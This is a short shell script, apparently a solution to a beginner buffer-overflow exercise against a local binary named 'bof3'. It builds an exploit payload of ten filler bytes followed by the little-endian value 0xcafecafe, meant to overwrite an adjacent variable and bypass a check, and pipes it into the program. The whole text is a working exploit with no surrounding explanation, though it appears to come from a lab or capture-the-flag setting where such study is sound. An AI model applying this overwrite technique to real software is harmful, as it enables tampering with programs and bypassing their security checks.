# fill s with 10 chars
payload='AAAABBBBCC'
# put the right int to bypass the condition, in little endian
payload="$payload\xfe\xca\xfe\xca"

echo -e $payload
echo -ne $payload | ./bof3
